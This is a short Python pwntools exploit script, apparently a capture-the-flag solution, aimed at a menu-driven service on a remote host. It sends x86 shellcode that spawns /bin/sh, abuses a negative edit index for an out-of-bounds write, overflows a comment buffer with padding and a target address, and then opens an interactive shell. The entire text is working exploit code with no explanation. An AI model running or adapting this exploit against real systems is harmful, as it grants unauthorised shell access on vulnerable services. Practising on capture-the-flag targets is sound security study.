from pwn import *

#r = remote("35.189.150.198", 36652)
r = remote("192.168.146.128", 9623)
shellcode = "\x00\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\
\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.sendlineafter("choice =>","1")
r.sendlineafter("Her age: ","1")
r.sendafter("Her name: ","asdf")
r.sendafter("About her(introduce): ",shellcode)

r.sendlineafter("choice =>","2")
r.sendlineafter("Edit page: ","-246")
r.sendlineafter("Her age: ","1")
r.sendlineafter("Her name: ","asdf")
r.sendafter("About her(introduce): ","asdf")

r.sendlineafter("choice =>","5")
r.sendlineafter("id : ","mk")
r.sendafter("comment : ","A"*196+p32(0x804B010))
r.sendlineafter("password: ","134525139")

r.interactive()
